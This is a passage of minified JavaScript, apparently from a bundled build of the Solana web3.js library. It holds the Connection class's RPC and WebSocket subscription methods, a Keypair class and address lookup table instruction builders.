        value: { blockhash: n },
      } = await this.getLatestBlockhashAndContext(t);
      return {
        context: e,
        value: {
          blockhash: n,
          feeCalculator: {
            get lamportsPerSignature() {
              throw new Error(
                "The capability to fetch `lamportsPerSignature` using the `getRecentBlockhash` API is no longer offered by the network. Use the `getFeeForMessage` API to obtain the fee for a given message."
              );
            },
            toJSON: () => ({}),
          },
        },
      };
    }
    async getRecentPerformanceSamples(t) {
      const e = Xr(
        await this._rpcRequest("getRecentPerformanceSamples", t ? [t] : []),
        Ku
      );
      if ("error" in e)
        throw new Ms(e.error, "failed to get recent performance samples");
      return e.result;
    }
    async getFeeCalculatorForBlockhash(t, e) {
      const n = this._buildArgs([t], e),
        r = Xr(await this._rpcRequest("getFeeCalculatorForBlockhash", n), Wu);
      if ("error" in r) throw new Ms(r.error, "failed to get fee calculator");
      const { context: o, value: i } = r.result;
      return { context: o, value: null !== i ? i.feeCalculator : null };
    }
    async getFeeForMessage(t, e) {
      const n = ji(t.serialize()).toString("base64"),
        r = this._buildArgs([n], e),
        o = Xr(await this._rpcRequest("getFeeForMessage", r), ha(ro(oo())));
      if ("error" in o) throw new Ms(o.error, "failed to get fee for message");
      if (null === o.result) throw new Error("invalid blockhash");
      return o.result;
    }
    async getRecentPrioritizationFees(t) {
      var e;
      const n =
          null == (e = null == t ? void 0 : t.lockedWritableAccounts)
            ? void 0
            : e.map((t) => t.toBase58()),
        r = (null == n ? void 0 : n.length) ? [n] : [],
        o = Xr(await this._rpcRequest("getRecentPrioritizationFees", r), Ra);
      if ("error" in o)
        throw new Ms(o.error, "failed to get recent prioritization fees");
      return o.result;
    }
    async getRecentBlockhash(t) {
      try {
        return (await this.getRecentBlockhashAndContext(t)).value;
      } catch (e) {
        throw new Error("failed to get recent blockhash: " + e);
      }
    }
    async getLatestBlockhash(t) {
      try {
        return (await this.getLatestBlockhashAndContext(t)).value;
      } catch (e) {
        throw new Error("failed to get recent blockhash: " + e);
      }
    }
    async getLatestBlockhashAndContext(t) {
      const { commitment: e, config: n } = ua(t),
        r = this._buildArgs([], e, void 0, n),
        o = Xr(await this._rpcRequest("getLatestBlockhash", r), qu);
      if ("error" in o) throw new Ms(o.error, "failed to get latest blockhash");
      return o.result;
    }
    async isBlockhashValid(t, e) {
      const { commitment: n, config: r } = ua(e),
        o = this._buildArgs([t], n, void 0, r),
        i = Xr(await this._rpcRequest("isBlockhashValid", o), zu);
      if ("error" in i)
        throw new Ms(
          i.error,
          "failed to determine if the blockhash `" + t + "`is valid"
        );
      return i.result;
    }
    async getVersion() {
      const t = Xr(await this._rpcRequest("getVersion", []), fa(Ta));
      if ("error" in t) throw new Ms(t.error, "failed to get version");
      return t.result;
    }
    async getGenesisHash() {
      const t = Xr(await this._rpcRequest("getGenesisHash", []), fa(ao()));
      if ("error" in t) throw new Ms(t.error, "failed to get genesis hash");
      return t.result;
    }
    async getBlock(t, e) {
      const { commitment: n, config: r } = ua(e),
        o = this._buildArgsAtLeastConfirmed([t], n, void 0, r),
        i = await this._rpcRequest("getBlock", o);
      try {
        switch (null == r ? void 0 : r.transactionDetails) {
          case "accounts": {
            const t = Xr(i, Pu);
            if ("error" in t) throw t.error;
            return t.result;
          }
          case "none": {
            const t = Xr(i, xu);
            if ("error" in t) throw t.error;
            return t.result;
          }
          default: {
            const t = Xr(i, Eu);
            if ("error" in t) throw t.error;
            const { result: e } = t;
            return e
              ? {
                  ...e,
                  transactions: e.transactions.map(
                    ({ transaction: t, meta: e, version: n }) => ({
                      meta: e,
                      transaction: { ...t, message: ma(n, t.message) },
                      version: n,
                    })
                  ),
                }
              : null;
          }
        }
      } catch (s) {
        throw new Ms(s, "failed to get confirmed block");
      }
    }
    async getParsedBlock(t, e) {
      const { commitment: n, config: r } = ua(e),
        o = this._buildArgsAtLeastConfirmed([t], n, "jsonParsed", r),
        i = await this._rpcRequest("getBlock", o);
      try {
        switch (null == r ? void 0 : r.transactionDetails) {
          case "accounts": {
            const t = Xr(i, Ru);
            if ("error" in t) throw t.error;
            return t.result;
          }
          case "none": {
            const t = Xr(i, Mu);
            if ("error" in t) throw t.error;
            return t.result;
          }
          default: {
            const t = Xr(i, Ou);
            if ("error" in t) throw t.error;
            return t.result;
          }
        }
      } catch (s) {
        throw new Ms(s, "failed to get block");
      }
    }
    async getBlockProduction(t) {
      let e, n;
      if ("string" == typeof t) n = t;
      else if (t) {
        const { commitment: r, ...o } = t;
        (n = r), (e = o);
      }
      const r = this._buildArgs([], n, "base64", e),
        o = Xr(await this._rpcRequest("getBlockProduction", r), xa);
      if ("error" in o)
        throw new Ms(o.error, "failed to get block production information");
      return o.result;
    }
    async getTransaction(t, e) {
      const { commitment: n, config: r } = ua(e),
        o = this._buildArgsAtLeastConfirmed([t], n, void 0, r),
        i = Xr(await this._rpcRequest("getTransaction", o), Du);
      if ("error" in i) throw new Ms(i.error, "failed to get transaction");
      const s = i.result;
      return s
        ? {
            ...s,
            transaction: {
              ...s.transaction,
              message: ma(s.version, s.transaction.message),
            },
          }
        : s;
    }
    async getParsedTransaction(t, e) {
      const { commitment: n, config: r } = ua(e),
        o = this._buildArgsAtLeastConfirmed([t], n, "jsonParsed", r),
        i = Xr(await this._rpcRequest("getTransaction", o), Uu);
      if ("error" in i) throw new Ms(i.error, "failed to get transaction");
      return i.result;
    }
    async getParsedTransactions(t, e) {
      const { commitment: n, config: r } = ua(e),
        o = t.map((t) => ({
          methodName: "getTransaction",
          args: this._buildArgsAtLeastConfirmed([t], n, "jsonParsed", r),
        }));
      return (await this._rpcBatchRequest(o)).map((t) => {
        const e = Xr(t, Uu);
        if ("error" in e) throw new Ms(e.error, "failed to get transactions");
        return e.result;
      });
    }
    async getTransactions(t, e) {
      const { commitment: n, config: r } = ua(e),
        o = t.map((t) => ({
          methodName: "getTransaction",
          args: this._buildArgsAtLeastConfirmed([t], n, void 0, r),
        }));
      return (await this._rpcBatchRequest(o)).map((t) => {
        const e = Xr(t, Du);
        if ("error" in e) throw new Ms(e.error, "failed to get transactions");
        const n = e.result;
        return n
          ? {
              ...n,
              transaction: {
                ...n.transaction,
                message: ma(n.version, n.transaction.message),
              },
            }
          : n;
      });
    }
    async getConfirmedBlock(t, e) {
      const n = this._buildArgsAtLeastConfirmed([t], e),
        r = Xr(await this._rpcRequest("getBlock", n), Lu);
      if ("error" in r) throw new Ms(r.error, "failed to get confirmed block");
      const o = r.result;
      if (!o) throw new Error("Confirmed block " + t + " not found");
      const i = {
        ...o,
        transactions: o.transactions.map(({ transaction: t, meta: e }) => {
          const n = new ms(t.message);
          return { meta: e, transaction: { ...t, message: n } };
        }),
      };
      return {
        ...i,
        transactions: i.transactions.map(({ transaction: t, meta: e }) => ({
          meta: e,
          transaction: As.populate(t.message, t.signatures),
        })),
      };
    }
    async getBlocks(t, e, n) {
      const r = this._buildArgsAtLeastConfirmed(void 0 !== e ? [t, e] : [t], n),
        o = Xr(await this._rpcRequest("getBlocks", r), fa($r(oo())));
      if ("error" in o) throw new Ms(o.error, "failed to get blocks");
      return o.result;
    }
    async getBlockSignatures(t, e) {
      const n = this._buildArgsAtLeastConfirmed([t], e, void 0, {
          transactionDetails: "signatures",
          rewards: !1,
        }),
        r = Xr(await this._rpcRequest("getBlock", n), Nu);
      if ("error" in r) throw new Ms(r.error, "failed to get block");
      const o = r.result;
      if (!o) throw new Error("Block " + t + " not found");
      return o;
    }
    async getConfirmedBlockSignatures(t, e) {
      const n = this._buildArgsAtLeastConfirmed([t], e, void 0, {
          transactionDetails: "signatures",
          rewards: !1,
        }),
        r = Xr(await this._rpcRequest("getBlock", n), Nu);
      if ("error" in r) throw new Ms(r.error, "failed to get confirmed block");
      const o = r.result;
      if (!o) throw new Error("Confirmed block " + t + " not found");
      return o;
    }
    async getConfirmedTransaction(t, e) {
      const n = this._buildArgsAtLeastConfirmed([t], e),
        r = Xr(await this._rpcRequest("getTransaction", n), Du);
      if ("error" in r) throw new Ms(r.error, "failed to get transaction");
      const o = r.result;
      if (!o) return o;
      const i = new ms(o.transaction.message),
        s = o.transaction.signatures;
      return { ...o, transaction: As.populate(i, s) };
    }
    async getParsedConfirmedTransaction(t, e) {
      const n = this._buildArgsAtLeastConfirmed([t], e, "jsonParsed"),
        r = Xr(await this._rpcRequest("getTransaction", n), Uu);
      if ("error" in r)
        throw new Ms(r.error, "failed to get confirmed transaction");
      return r.result;
    }
    async getParsedConfirmedTransactions(t, e) {
      const n = t.map((t) => ({
        methodName: "getTransaction",
        args: this._buildArgsAtLeastConfirmed([t], e, "jsonParsed"),
      }));
      return (await this._rpcBatchRequest(n)).map((t) => {
        const e = Xr(t, Uu);
        if ("error" in e)
          throw new Ms(e.error, "failed to get confirmed transactions");
        return e.result;
      });
    }
    async getConfirmedSignaturesForAddress(t, e, n) {
      let r = {},
        o = await this.getFirstAvailableBlock();
      for (; !("until" in r) && !(--e <= 0 || e < o); )
        try {
          const t = await this.getConfirmedBlockSignatures(e, "finalized");
          t.signatures.length > 0 &&
            (r.until = t.signatures[t.signatures.length - 1].toString());
        } catch (s) {
          if (s instanceof Error && s.message.includes("skipped")) continue;
          throw s;
        }
      let i = await this.getSlot("finalized");
      for (; !("before" in r || ++n > i); )
        try {
          const t = await this.getConfirmedBlockSignatures(n);
          t.signatures.length > 0 &&
            (r.before = t.signatures[t.signatures.length - 1].toString());
        } catch (s) {
          if (s instanceof Error && s.message.includes("skipped")) continue;
          throw s;
        }
      return (await this.getConfirmedSignaturesForAddress2(t, r)).map(
        (t) => t.signature
      );
    }
    async getConfirmedSignaturesForAddress2(t, e, n) {
      const r = this._buildArgsAtLeastConfirmed([t.toBase58()], n, void 0, e),
        o = Xr(
          await this._rpcRequest("getConfirmedSignaturesForAddress2", r),
          Ya
        );
      if ("error" in o)
        throw new Ms(o.error, "failed to get confirmed signatures for address");
      return o.result;
    }
    async getSignaturesForAddress(t, e, n) {
      const r = this._buildArgsAtLeastConfirmed([t.toBase58()], n, void 0, e),
        o = Xr(await this._rpcRequest("getSignaturesForAddress", r), Qa);
      if ("error" in o)
        throw new Ms(o.error, "failed to get signatures for address");
      return o.result;
    }
    async getAddressLookupTable(t, e) {
      const { context: n, value: r } = await this.getAccountInfoAndContext(
        t,
        e
      );
      let o = null;
      return (
        null !== r && (o = new na({ key: t, state: na.deserialize(r.data) })),
        { context: n, value: o }
      );
    }
    async getNonceAndContext(t, e) {
      const { context: n, value: r } = await this.getAccountInfoAndContext(
        t,
        e
      );
      let o = null;
      return (
        null !== r && (o = Ws.fromAccountData(r.data)), { context: n, value: o }
      );
    }
    async getNonce(t, e) {
      return await this.getNonceAndContext(t, e)
        .then((t) => t.value)
        .catch((e) => {
          throw new Error(
            "failed to get nonce for account " + t.toBase58() + ": " + e
          );
        });
    }
    async requestAirdrop(t, e) {
      const n = Xr(
        await this._rpcRequest("requestAirdrop", [t.toBase58(), e]),
        Fu
      );
      if ("error" in n)
        throw new Ms(n.error, `airdrop to ${t.toBase58()} failed`);
      return n.result;
    }
    async _blockhashWithExpiryBlockHeight(t) {
      if (!t) {
        for (; this._pollingBlockhash; ) await Ns(100);
        const t = Date.now() - this._blockhashInfo.lastFetch >= 3e4;
        if (null !== this._blockhashInfo.latestBlockhash && !t)
          return this._blockhashInfo.latestBlockhash;
      }
      return await this._pollNewBlockhash();
    }
    async _pollNewBlockhash() {
      this._pollingBlockhash = !0;
      try {
        const t = Date.now(),
          e = this._blockhashInfo.latestBlockhash,
          n = e ? e.blockhash : null;
        for (let r = 0; r < 50; r++) {
          const t = await this.getLatestBlockhash("finalized");
          if (n !== t.blockhash)
            return (
              (this._blockhashInfo = {
                latestBlockhash: t,
                lastFetch: Date.now(),
                transactionSignatures: [],
                simulatedSignatures: [],
              }),
              t
            );
          await Ns(200);
        }
        throw new Error(
          `Unable to obtain a new blockhash after ${Date.now() - t}ms`
        );
      } finally {
        this._pollingBlockhash = !1;
      }
    }
    async getStakeMinimumDelegation(t) {
      const { commitment: e, config: n } = ua(t),
        r = this._buildArgs([], e, "base64", n),
        o = Xr(
          await this._rpcRequest("getStakeMinimumDelegation", r),
          ha(oo())
        );
      if ("error" in o)
        throw new Ms(o.error, "failed to get stake minimum delegation");
      return o.result;
    }
    async simulateTransaction(t, e, n) {
      if ("message" in t) {
        const r = t.serialize(),
          o = ft.from(r).toString("base64");
        if (Array.isArray(e) || void 0 !== n)
          throw new Error("Invalid arguments");
        const i = e || {};
        (i.encoding = "base64"),
          "commitment" in i || (i.commitment = this.commitment),
          e &&
            "object" == typeof e &&
            "innerInstructions" in e &&
            (i.innerInstructions = e.innerInstructions);
        const s = [o, i],
          a = Xr(await this._rpcRequest("simulateTransaction", s), Ea);
        if ("error" in a)
          throw new Error("failed to simulate transaction: " + a.error.message);
        return a.result;
      }
      let r;
      if (t instanceof As) {
        let e = t;
        (r = new As()),
          (r.feePayer = e.feePayer),
          (r.instructions = t.instructions),
          (r.nonceInfo = e.nonceInfo),
          (r.signatures = e.signatures);
      } else (r = As.populate(t)), (r._message = r._json = void 0);
      if (void 0 !== e && !Array.isArray(e))
        throw new Error("Invalid arguments");
      const o = e;
      if (r.nonceInfo && o) r.sign(...o);
      else {
        let t = this._disableBlockhashCaching;
        for (;;) {
          const e = await this._blockhashWithExpiryBlockHeight(t);
          if (
            ((r.lastValidBlockHeight = e.lastValidBlockHeight),
            (r.recentBlockhash = e.blockhash),
            !o)
          )
            break;
          if ((r.sign(...o), !r.signature)) throw new Error("!signature");
          const n = r.signature.toString("base64");
          if (
            !this._blockhashInfo.simulatedSignatures.includes(n) &&
            !this._blockhashInfo.transactionSignatures.includes(n)
          ) {
            this._blockhashInfo.simulatedSignatures.push(n);
            break;
          }
          t = !0;
        }
      }
      const i = r._compile(),
        s = i.serialize(),
        a = r._serialize(s).toString("base64"),
        u = { encoding: "base64", commitment: this.commitment };
      if (n) {
        const t = (Array.isArray(n) ? n : i.nonProgramIds()).map((t) =>
          t.toBase58()
        );
        u.accounts = { encoding: "base64", addresses: t };
      }
      o && (u.sigVerify = !0),
        e &&
          "object" == typeof e &&
          "innerInstructions" in e &&
          (u.innerInstructions = e.innerInstructions);
      const c = [a, u],
        l = Xr(await this._rpcRequest("simulateTransaction", c), Ea);
      if ("error" in l) {
        let t;
        if (
          "data" in l.error &&
          ((t = l.error.data.logs), t && Array.isArray(t))
        ) {
          const e = "\n    ";
          t.join(e);
          void 0;
        }
        throw new Rs({
          action: "simulate",
          signature: "",
          transactionMessage: l.error.message,
          logs: t,
        });
      }
      return l.result;
    }
    async sendTransaction(t, e, n) {
      if ("version" in t) {
        if (e && Array.isArray(e)) throw new Error("Invalid arguments");
        const n = t.serialize();
        return await this.sendRawTransaction(n, e);
      }
      if (void 0 === e || !Array.isArray(e))
        throw new Error("Invalid arguments");
      const r = e;
      if (t.nonceInfo) t.sign(...r);
      else {
        let e = this._disableBlockhashCaching;
        for (;;) {
          const n = await this._blockhashWithExpiryBlockHeight(e);
          if (
            ((t.lastValidBlockHeight = n.lastValidBlockHeight),
            (t.recentBlockhash = n.blockhash),
            t.sign(...r),
            !t.signature)
          )
            throw new Error("!signature");
          const o = t.signature.toString("base64");
          if (!this._blockhashInfo.transactionSignatures.includes(o)) {
            this._blockhashInfo.transactionSignatures.push(o);
            break;
          }
          e = !0;
        }
      }
      const o = t.serialize();
      return await this.sendRawTransaction(o, n);
    }
    async sendRawTransaction(t, e) {
      const n = ji(t).toString("base64");
      return await this.sendEncodedTransaction(n, e);
    }
    async sendEncodedTransaction(t, e) {
      const n = { encoding: "base64" },
        r = e && e.skipPreflight,
        o =
          !0 === r
            ? "processed"
            : (e && e.preflightCommitment) || this.commitment;
      e && null != e.maxRetries && (n.maxRetries = e.maxRetries),
        e && null != e.minContextSlot && (n.minContextSlot = e.minContextSlot),
        r && (n.skipPreflight = r),
        o && (n.preflightCommitment = o);
      const i = [t, n],
        s = Xr(await this._rpcRequest("sendTransaction", i), ju);
      if ("error" in s) {
        let t;
        throw (
          ("data" in s.error && (t = s.error.data.logs),
          new Rs({
            action: r ? "send" : "simulate",
            signature: "",
            transactionMessage: s.error.message,
            logs: t,
          }))
        );
      }
      return s.result;
    }
    _wsOnOpen() {
      (this._rpcWebSocketConnected = !0),
        (this._rpcWebSocketHeartbeat = setInterval(() => {
          (async () => {
            try {
              await this._rpcWebSocket.notify("ping");
            } catch {}
          })();
        }, 5e3)),
        this._updateSubscriptions();
    }
    _wsOnError(t) {
      this._rpcWebSocketConnected = !1;
    }
    _wsOnClose(t) {
      if (
        ((this._rpcWebSocketConnected = !1),
        (this._rpcWebSocketGeneration =
          (this._rpcWebSocketGeneration + 1) % Number.MAX_SAFE_INTEGER),
        this._rpcWebSocketIdleTimeout &&
          (clearTimeout(this._rpcWebSocketIdleTimeout),
          (this._rpcWebSocketIdleTimeout = null)),
        this._rpcWebSocketHeartbeat &&
          (clearInterval(this._rpcWebSocketHeartbeat),
          (this._rpcWebSocketHeartbeat = null)),
        1e3 === t)
      )
        return this._updateSubscriptions(), void 0;
      (this._subscriptionCallbacksByServerSubscriptionId = {}),
        Object.entries(this._subscriptionsByHash).forEach(([t, e]) => {
          this._setSubscription(t, { ...e, state: "pending" });
        });
    }
    _setSubscription(t, e) {
      var n;
      const r = null == (n = this._subscriptionsByHash[t]) ? void 0 : n.state;
      if (((this._subscriptionsByHash[t] = e), r !== e.state)) {
        const n = this._subscriptionStateChangeCallbacksByHash[t];
        n &&
          n.forEach((t) => {
            try {
              t(e.state);
            } catch {}
          });
      }
    }
    _onSubscriptionStateChange(t, e) {
      var n;
      const r = this._subscriptionHashByClientSubscriptionId[t];
      if (null == r) return () => {};
      const o =
        (n = this._subscriptionStateChangeCallbacksByHash)[r] ||
        (n[r] = new Set());
      return (
        o.add(e),
        () => {
          o.delete(e),
            0 === o.size &&
              delete this._subscriptionStateChangeCallbacksByHash[r];
        }
      );
    }
    async _updateSubscriptions() {
      if (0 === Object.keys(this._subscriptionsByHash).length)
        return (
          this._rpcWebSocketConnected &&
            ((this._rpcWebSocketConnected = !1),
            (this._rpcWebSocketIdleTimeout = setTimeout(() => {
              this._rpcWebSocketIdleTimeout = null;
              try {
                this._rpcWebSocket.close();
              } catch (t) {
                t instanceof Error, 0;
              }
            }, 500))),
          void 0
        );
      if (
        (null !== this._rpcWebSocketIdleTimeout &&
          (clearTimeout(this._rpcWebSocketIdleTimeout),
          (this._rpcWebSocketIdleTimeout = null),
          (this._rpcWebSocketConnected = !0)),
        !this._rpcWebSocketConnected)
      )
        return this._rpcWebSocket.connect(), void 0;
      const t = this._rpcWebSocketGeneration,
        e = () => t === this._rpcWebSocketGeneration;
      await Promise.all(
        Object.keys(this._subscriptionsByHash).map(async (t) => {
          const n = this._subscriptionsByHash[t];
          if (void 0 !== n)
            switch (n.state) {
              case "pending":
              case "unsubscribed":
                if (0 === n.callbacks.size)
                  return (
                    delete this._subscriptionsByHash[t],
                    "unsubscribed" === n.state &&
                      delete this._subscriptionCallbacksByServerSubscriptionId[
                        n.serverSubscriptionId
                      ],
                    await this._updateSubscriptions(),
                    void 0
                  );
                await (async () => {
                  const { args: r, method: o } = n;
                  try {
                    this._setSubscription(t, { ...n, state: "subscribing" });
                    const e = await this._rpcWebSocket.call(o, r);
                    this._setSubscription(t, {
                      ...n,
                      serverSubscriptionId: e,
                      state: "subscribed",
                    }),
                      (this._subscriptionCallbacksByServerSubscriptionId[e] =
                        n.callbacks),
                      await this._updateSubscriptions();
                  } catch (i) {
                    if ((void 0, !e())) return;
                    this._setSubscription(t, { ...n, state: "pending" }),
                      await this._updateSubscriptions();
                  }
                })();
                break;
              case "subscribed":
                0 === n.callbacks.size &&
                  (await (async () => {
                    const { serverSubscriptionId: r, unsubscribeMethod: o } = n;
                    if (this._subscriptionsAutoDisposedByRpc.has(r))
                      this._subscriptionsAutoDisposedByRpc.delete(r);
                    else {
                      this._setSubscription(t, {
                        ...n,
                        state: "unsubscribing",
                      }),
                        this._setSubscription(t, {
                          ...n,
                          state: "unsubscribing",
                        });
                      try {
                        await this._rpcWebSocket.call(o, [r]);
                      } catch (i) {
                        if ((i instanceof Error, 0, !e())) return;
                        return (
                          this._setSubscription(t, {
                            ...n,
                            state: "subscribed",
                          }),
                          await this._updateSubscriptions(),
                          void 0
                        );
                      }
                    }
                    this._setSubscription(t, { ...n, state: "unsubscribed" }),
                      await this._updateSubscriptions();
                  })());
            }
        })
      );
    }
    _handleServerNotification(t, e) {
      const n = this._subscriptionCallbacksByServerSubscriptionId[t];
      void 0 !== n &&
        n.forEach((t) => {
          try {
            t(...e);
          } catch (n) {
            void 0;
          }
        });
    }
    _wsOnAccountNotification(t) {
      const { result: e, subscription: n } = Xr(t, $a);
      this._handleServerNotification(n, [e.value, e.context]);
    }
    _makeSubscription(t, e) {
      const n = this._nextClientSubscriptionId++,
        r = Ys([t.method, e]),
        o = this._subscriptionsByHash[r];
      return (
        void 0 === o
          ? (this._subscriptionsByHash[r] = {
              ...t,
              args: e,
              callbacks: new Set([t.callback]),
              state: "pending",
            })
          : o.callbacks.add(t.callback),
        (this._subscriptionHashByClientSubscriptionId[n] = r),
        (this._subscriptionDisposeFunctionsByClientSubscriptionId[n] =
          async () => {
            delete this._subscriptionDisposeFunctionsByClientSubscriptionId[n],
              delete this._subscriptionHashByClientSubscriptionId[n];
            const e = this._subscriptionsByHash[r];
            ls(
              void 0 !== e,
              `Could not find a \`Subscription\` when tearing down client subscription #${n}`
            ),
              e.callbacks.delete(t.callback),
              await this._updateSubscriptions();
          }),
        this._updateSubscriptions(),
        n
      );
    }
    onAccountChange(t, e, n) {
      const { commitment: r, config: o } = ua(n),
        i = this._buildArgs(
          [t.toBase58()],
          r || this._commitment || "finalized",
          "base64",
          o
        );
      return this._makeSubscription(
        {
          callback: e,
          method: "accountSubscribe",
          unsubscribeMethod: "accountUnsubscribe",
        },
        i
      );
    }
    async removeAccountChangeListener(t) {
      await this._unsubscribeClientSubscription(t, "account change");
    }
    _wsOnProgramAccountNotification(t) {
      const { result: e, subscription: n } = Xr(t, eu);
      this._handleServerNotification(n, [
        { accountId: e.value.pubkey, accountInfo: e.value.account },
        e.context,
      ]);
    }
    onProgramAccountChange(t, e, n, r) {
      const { commitment: o, config: i } = ua(n),
        s = this._buildArgs(
          [t.toBase58()],
          o || this._commitment || "finalized",
          "base64",
          i || (r ? { filters: ca(r) } : void 0)
        );
      return this._makeSubscription(
        {
          callback: e,
          method: "programSubscribe",
          unsubscribeMethod: "programUnsubscribe",
        },
        s
      );
    }
    async removeProgramAccountChangeListener(t) {
      await this._unsubscribeClientSubscription(t, "program account change");
    }
    onLogs(t, e, n) {
      const r = this._buildArgs(
        ["object" == typeof t ? { mentions: [t.toString()] } : t],
        n || this._commitment || "finalized"
      );
      return this._makeSubscription(
        {
          callback: e,
          method: "logsSubscribe",
          unsubscribeMethod: "logsUnsubscribe",
        },
        r
      );
    }
    async removeOnLogsListener(t) {
      await this._unsubscribeClientSubscription(t, "logs");
    }
    _wsOnLogsNotification(t) {
      const { result: e, subscription: n } = Xr(t, Vu);
      this._handleServerNotification(n, [e.value, e.context]);
    }
    _wsOnSlotNotification(t) {
      const { result: e, subscription: n } = Xr(t, ru);
      this._handleServerNotification(n, [e]);
    }
    onSlotChange(t) {
      return this._makeSubscription(
        {
          callback: t,
          method: "slotSubscribe",
          unsubscribeMethod: "slotUnsubscribe",
        },
        []
      );
    }
    async removeSlotChangeListener(t) {
      await this._unsubscribeClientSubscription(t, "slot change");
    }
    _wsOnSlotUpdatesNotification(t) {
      const { result: e, subscription: n } = Xr(t, iu);
      this._handleServerNotification(n, [e]);
    }
    onSlotUpdate(t) {
      return this._makeSubscription(
        {
          callback: t,
          method: "slotsUpdatesSubscribe",
          unsubscribeMethod: "slotsUpdatesUnsubscribe",
        },
        []
      );
    }
    async removeSlotUpdateListener(t) {
      await this._unsubscribeClientSubscription(t, "slot update");
    }
    async _unsubscribeClientSubscription(t, e) {
      const n = this._subscriptionDisposeFunctionsByClientSubscriptionId[t];
      n ? await n() : void 0;
    }
    _buildArgs(t, e, n, r) {
      const o = e || this._commitment;
      if (o || n || r) {
        let e = {};
        n && (e.encoding = n),
          o && (e.commitment = o),
          r && (e = Object.assign(e, r)),
          t.push(e);
      }
      return t;
    }
    _buildArgsAtLeastConfirmed(t, e, n, r) {
      const o = e || this._commitment;
      if (o && !["confirmed", "finalized"].includes(o))
        throw new Error(
          "Using Connection with default commitment: `" +
            this._commitment +
            "`, but method requires at least `confirmed`"
        );
      return this._buildArgs(t, e, n, r);
    }
    _wsOnSignatureNotification(t) {
      const { result: e, subscription: n } = Xr(t, su);
      "receivedSignature" !== e.value &&
        this._subscriptionsAutoDisposedByRpc.add(n),
        this._handleServerNotification(
          n,
          "receivedSignature" === e.value
            ? [{ type: "received" }, e.context]
            : [{ type: "status", result: e.value }, e.context]
        );
    }
    onSignature(t, e, n) {
      const r = this._buildArgs([t], n || this._commitment || "finalized"),
        o = this._makeSubscription(
          {
            callback: (t, n) => {
              if ("status" === t.type) {
                e(t.result, n);
                try {
                  this.removeSignatureListener(o);
                } catch (r) {}
              }
            },
            method: "signatureSubscribe",
            unsubscribeMethod: "signatureUnsubscribe",
          },
          r
        );
      return o;
    }
    onSignatureWithOptions(t, e, n) {
      const { commitment: r, ...o } = {
          ...n,
          commitment: (n && n.commitment) || this._commitment || "finalized",
        },
        i = this._buildArgs([t], r, void 0, o),
        s = this._makeSubscription(
          {
            callback: (t, n) => {
              e(t, n);
              try {
                this.removeSignatureListener(s);
              } catch (r) {}
            },
            method: "signatureSubscribe",
            unsubscribeMethod: "signatureUnsubscribe",
          },
          i
        );
      return s;
    }
    async removeSignatureListener(t) {
      await this._unsubscribeClientSubscription(t, "signature result");
    }
    _wsOnRootNotification(t) {
      const { result: e, subscription: n } = Xr(t, au);
      this._handleServerNotification(n, [e]);
    }
    onRootChange(t) {
      return this._makeSubscription(
        {
          callback: t,
          method: "rootSubscribe",
          unsubscribeMethod: "rootUnsubscribe",
        },
        []
      );
    }
    async removeRootChangeListener(t) {
      await this._unsubscribeClientSubscription(t, "root change");
    }
  }
  class Xu {
    constructor(t) {
      (this._keypair = void 0), (this._keypair = t ?? qi());
    }
    static generate() {
      return new Xu(qi());
    }
    static fromSecretKey(t, e) {
      if (64 !== t.byteLength) throw new Error("bad secret key size");
      const n = t.slice(32, 64);
      if (!e || !e.skipValidation) {
        const e = t.slice(0, 32),
          r = zi(e);
        for (let t = 0; t < 32; t++)
          if (n[t] !== r[t]) throw new Error("provided secretKey is invalid");
      }
      return new Xu({ publicKey: n, secretKey: t });
    }
    static fromSeed(t) {
      const e = zi(t),
        n = new Uint8Array(64);
      return n.set(t), n.set(e, 32), new Xu({ publicKey: e, secretKey: n });
    }
    get publicKey() {
      return new Ji(this._keypair.publicKey);
    }
    get secretKey() {
      return new Uint8Array(this._keypair.secretKey);
    }
  }
  const Ju = Object.freeze({
    CreateLookupTable: {
      index: 0,
      layout: Er.struct([
        Er.u32("instruction"),
        Fs("recentSlot"),
        Er.u8("bumpSeed"),
      ]),
    },
    FreezeLookupTable: { index: 1, layout: Er.struct([Er.u32("instruction")]) },
    ExtendLookupTable: {
      index: 2,
      layout: Er.struct([
        Er.u32("instruction"),
        Fs(),
        Er.seq(os(), Er.offset(Er.u32(), -8), "addresses"),
      ]),
    },
    DeactivateLookupTable: {
      index: 3,
      layout: Er.struct([Er.u32("instruction")]),
    },
    CloseLookupTable: { index: 4, layout: Er.struct([Er.u32("instruction")]) },
  });
  class Yu {
    constructor() {}
    static createLookupTable(t) {
      const [e, n] = Ji.findProgramAddressSync(
          [t.authority.toBuffer(), Ur().encode(t.recentSlot)],
          this.programId
        ),
        r = Ds(Ju.CreateLookupTable, {
          recentSlot: BigInt(t.recentSlot),
          bumpSeed: n,
        }),
        o = [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: t.authority, isSigner: !0, isWritable: !1 },
          { pubkey: t.payer, isSigner: !0, isWritable: !0 },
          { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
        ];
      return [new vs({ programId: this.programId, keys: o, data: r }), e];
    }
    static freezeLookupTable(t) {
      const e = Ds(Ju.FreezeLookupTable),
        n = [
          { pubkey: t.lookupTable, isSigner: !1, isWritable: !0 },
          { pubkey: t.authority, isSigner: !0, isWritable: !1 },
        ];
      return new vs({ programId: this.programId, keys: n, data: e });
    }
    static extendLookupTable(t) {
      const e = Ds(Ju.ExtendLookupTable, {
          addresses: t.addresses.map((t) => t.toBytes()),
        }),
        n = [
          { pubkey: t.lookupTable, isSigner: !1, isWritable: !0 },
          { pubkey: t.authority, isSigner: !0, isWritable: !1 },
        ];
      return (
        t.payer &&
          n.push(
            { pubkey: t.payer, isSigner: !0, isWritable: !0 },
            { pubkey: Gs.programId, isSigner: !1, isWritable: !1 }
          ),
        new vs({ programId: this.programId, keys: n, data: e })
      );
    }
    static deactivateLookupTable(t) {
      const e = Ds(Ju.DeactivateLookupTable),
        n = [
          { pubkey: t.lookupTable, isSigner: !1, isWritable: !0 },
          { pubkey: t.authority, isSigner: !0, isWritable: !1 },
        ];
      return new vs({ programId: this.programId, keys: n, data: e });
    }
    static closeLookupTable(t) {
      const e = Ds(Ju.CloseLookupTable),
        n = [
          { pubkey: t.lookupTable, isSigner: !1, isWritable: !0 },
          { pubkey: t.authority, isSigner: !0, isWritable: !1 },
          { pubkey: t.recipient, isSigner: !1, isWritable: !0 },
        ];
      return new vs({ programId: this.programId, keys: n, data: e });
    }
  }
  Yu.programId = new Ji("AddressLookupTab1e1111111111111111111111111");
  const Qu = Object.freeze({
    RequestUnits: {
      index: 0,
      layout: Er.struct([
        Er.u8("instruction"),
        Er.u32("units"),
        Er.u32("additionalFee"),
